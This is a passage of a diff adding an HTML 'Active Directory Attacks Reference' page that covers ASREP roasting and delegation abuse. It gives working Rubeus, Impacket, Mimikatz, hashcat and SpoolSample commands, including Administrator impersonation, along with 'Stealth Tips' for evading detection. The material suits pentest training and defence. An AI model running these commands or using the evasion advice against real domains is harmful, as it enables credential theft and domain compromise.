+                            <div class="example-title">Cracking:</div>
+                            <code>hashcat -m 13100 hashes.txt rockyou.txt -O</code>
+                        </div>
+                    </div>
+                    
+                    <!-- Added OPSEC Section -->
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-user-secret"></i> OPSEC Considerations
+                        </div>
+                        <div class="opsec-box">
+                            <div class="opsec-title">Detection Risks:</div>
+                            • DC event 4769 (service ticket requested) for multiple SPNs<br>
+                            • Large number of TGS requests from single user in short time<br>
+                            • Suspicious Kerberos ticket requests (monitored by tools like ATA)
+                        </div>
+                        <div class="opsec-box">
+                            <div class="opsec-title">Stealth Tips:</div>
+                            • Request tickets slowly over time (not all at once)<br>
+                            • Target specific SPNs rather than all<br>
+                            • Use legitimate domain accounts for requests<br>
+                            • Crack offline on separate system
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- ASREP Roasting -->
+                <div class="attack-card" style="border-color: #ec4899;">
+                    <h3 class="attack-title">
+                        <i class="fas fa-user-secret attack-icon" style="color: #ec4899;"></i>
+                        ASREP Roasting
+                    </h3>
+                    
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-info-circle"></i> Description
+                        </div>
+                        <p>Targeting accounts with "Do not require Kerberos pre-authentication" enabled to request TGTs that can be cracked offline.</p>
+                    </div>
+                    
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-clipboard-check"></i> Requirements
+                        </div>
+                        <p>Accounts with pre-authentication disabled and weak passwords.</p>
+                    </div>
+                    
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-tools"></i> Tools
+                        </div>
+                        <div class="tool-list">
+                            <span class="tool-tag">Rubeus</span>
+                            <span class="tool-tag">Impacket</span>
+                            <span class="tool-tag">Hashcat</span>
+                        </div>
+                    </div>
+                    
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-exclamation-triangle"></i> Impact
+                        </div>
+                        <p class="impact-medium">Medium: Obtain user credentials if passwords are weak.</p>
+                    </div>
+                    
+                    <!-- Added Commands Section -->
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-terminal"></i> Example Commands
+                        </div>
+                        <div class="example-box">
+                            <div class="example-title">Rubeus:</div>
+                            <code>Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt</code>
+                        </div>
+                        <div class="example-box">
+                            <div class="example-title">Impacket:</div>
+                            <code>python3 GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt</code>
+                        </div>
+                        <div class="example-box">
+                            <div class="example-title">Cracking:</div>
+                            <code>hashcat -m 18200 asrep_hashes.txt rockyou.txt -O</code>
+                        </div>
+                        <div class="example-box">
+                            <div class="example-title">PowerView to find users:</div>
+                            <code>Get-DomainUser -PreauthNotRequired | select samaccountname</code>
+                        </div>
+                    </div>
+                    
+                    <!-- Added OPSEC Section -->
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-user-secret"></i> OPSEC Considerations
+                        </div>
+                        <div class="opsec-box">
+                            <div class="opsec-title">Detection Risks:</div>
+                            • DC event 4768 with error code 0x0 (PREAUTH_NOT_REQUIRED)<br>
+                            • Multiple AS-REQ requests for different users<br>
+                            • Unusual source IPs requesting AS-REP tickets
+                        </div>
+                        <div class="opsec-box">
+                            <div class="opsec-title">Stealth Tips:</div>
+                            • Target specific known vulnerable accounts only<br>
+                            • Perform reconnaissance first to identify target accounts<br>
+                            • Request during normal business hours<br>
+                            • Use legitimate domain workstations when possible
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Unconstrained Delegation -->
+                <div class="attack-card" style="border-color: #10b981;">
+                    <h3 class="attack-title">
+                        <i class="fas fa-expand-arrows-alt attack-icon" style="color: #10b981;"></i>
+                        Unconstrained Delegation
+                    </h3>
+                    
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-info-circle"></i> Description
+                        </div>
+                        <p>Compromising a system with unconstrained delegation to capture TGTs of authenticating users, including privileged accounts.</p>
+                    </div>
+                    
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-clipboard-check"></i> Requirements
+                        </div>
+                        <p>Compromise of a system with unconstrained delegation enabled and a privileged user authenticating to it.</p>
+                    </div>
+                    
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-tools"></i> Tools
+                        </div>
+                        <div class="tool-list">
+                            <span class="tool-tag">Mimikatz</span>
+                            <span class="tool-tag">Rubeus</span>
+                            <span class="tool-tag">SpoolSample</span>
+                        </div>
+                    </div>
+                    
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-exclamation-triangle"></i> Impact
+                        </div>
+                        <p class="impact-high">High: Capture high-privilege TGTs leading to domain compromise.</p>
+                    </div>
+                    
+                    <!-- Added Commands Section -->
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-terminal"></i> Example Commands
+                        </div>
+                        <div class="example-box">
+                            <div class="example-title">Find delegation systems:</div>
+                            <code>Get-DomainComputer -Unconstrained | select dnshostname</code>
+                        </div>
+                        <div class="example-box">
+                            <div class="example-title">Rubeus monitor:</div>
+                            <code>Rubeus.exe monitor /interval:5 /filteruser:DC01$</code>
+                        </div>
+                        <div class="example-box">
+                            <div class="example-title">Mimikatz dump tickets:</div>
+                            <code>sekurlsa::tickets /export</code>
+                        </div>
+                        <div class="example-box">
+                            <div class="example-title">Print spooler coercion:</div>
+                            <code>SpoolSample.exe DC01 unconstrained-server</code>
+                        </div>
+                    </div>
+                    
+                    <!-- Added OPSEC Section -->
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-user-secret"></i> OPSEC Considerations
+                        </div>
+                        <div class="opsec-box">
+                            <div class="opsec-title">Detection Risks:</div>
+                            • Unusual TGT storage on non-DC systems (event 4624, logon type 3)<br>
+                            • Print spooler service abuse (events 4624, 5140)<br>
+                            • Multiple privileged accounts authenticating to single server
+                        </div>
+                        <div class="opsec-box">
+                            <div class="opsec-title">Stealth Tips:</div>
+                            • Only extract specific high-value tickets (not all)<br>
+                            • Use Print Spooler coercion during business hours<br>
+                            • Clean up extracted tickets from disk<br>
+                            • Don't leave monitoring tools running indefinitely
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Constrained Delegation -->
+                <div class="attack-card" style="border-color: #06b6d4;">
+                    <h3 class="attack-title">
+                        <i class="fas fa-compress-arrows-alt attack-icon" style="color: #06b6d4;"></i>
+                        Constrained Delegation
+                    </h3>
+                    
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-info-circle"></i> Description
+                        </div>
+                        <p>Abusing constrained delegation permissions to impersonate users to specific services, potentially leading to privilege escalation.</p>
+                    </div>
+                    
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-clipboard-check"></i> Requirements
+                        </div>
+                        <p>Compromise of an account with constrained delegation rights or the associated computer account.</p>
+                    </div>
+                    
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-tools"></i> Tools
+                        </div>
+                        <div class="tool-list">
+                            <span class="tool-tag">Rubeus</span>
+                            <span class="tool-tag">Kekeo</span>
+                            <span class="tool-tag">Impacket</span>
+                        </div>
+                    </div>
+                    
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-exclamation-triangle"></i> Impact
+                        </div>
+                        <p class="impact-high">High: Access to delegated services and potential privilege escalation.</p>
+                    </div>
+                    
+                    <!-- Added Commands Section -->
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-terminal"></i> Example Commands
+                        </div>
+                        <div class="example-box">
+                            <div class="example-title">Find delegation accounts:</div>
+                            <code>Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto</code>
+                        </div>
+                        <div class="example-box">
+                            <div class="example-title">Rubeus S4U attack:</div>
+                            <code>Rubeus.exe s4u /user:webserver$ /rc4:hash /impersonateuser:Administrator /msdsspn:cifs/dc.domain.local /ptt</code>
+                        </div>
+                        <div class="example-box">
+                            <div class="example-title">Kekeo:</div>
+                            <code>tgs::s4u /tgt:TGT_webserver$@DOMAIN.LOCAL_krbtgt~DOMAIN.LOCAL@DOMAIN.LOCAL.kirbi /user:Administrator@domain.local /service:cifs/dc.domain.local</code>
+                        </div>
+                    </div>
+                    
+                    <!-- Added OPSEC Section -->
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-user-secret"></i> OPSEC Considerations
+                        </div>
+                        <div class="opsec-box">
+                            <div class="opsec-title">Detection Risks:</div>
+                            • DC event 4769 with "Service Name" not matching requesting user<br>
+                            • S4U2Self and S4U2Proxy events from unusual sources<br>
+                            • Constrained delegation abuse alerts in ATA/AD monitoring
+                        </div>
+                        <div class="opsec-box">
+                            <div class="opsec-title">Stealth Tips:</div>
+                            • Use Resource-based Constrained Delegation (RBCD) when possible<br>
+                            • Target non-critical services first<br>
+                            • Limit impersonation to necessary privileges only<br>
+                            • Clean up tickets after use
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+           
+        </section>
+        
+        <footer>
+            <p>Active Directory Attacks Reference | For Educational Purposes </p>
+        </footer>
+    </div>
+
+    <script>
+        // Tab switching function
+        function switchTab(tabName) {
+            // Hide all tab contents
+            document.querySelectorAll('.tab-content').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            
+            // Remove active class from all buttons
+            document.querySelectorAll('.tab-button').forEach(button => {
+                button.classList.remove('active');
+            });
+            
+            // Show selected tab and activate button
+            document.getElementById(tabName).classList.add('active');
+            event.target.classList.add('active');
+        }
+        
+        // Simple animation for cards when they come into view
+        document.addEventListener('DOMContentLoaded', function() {
+            const conceptCards = document.querySelectorAll('.concept-card, .attack-card, .command-card');
+            
+            const observer = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        entry.target.style.opacity = '1';
+                        entry.target.style.transform = 'translateY(0)';
+                    }
+                });
+            }, { threshold: 0.1 });
+            
+            conceptCards.forEach(card => {
+                card.style.opacity = '0';
+                card.style.transform = 'translateY(20px)';
+                card.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
+                observer.observe(card);
+            });
+        });
+    </script>
+</body>
+</html>
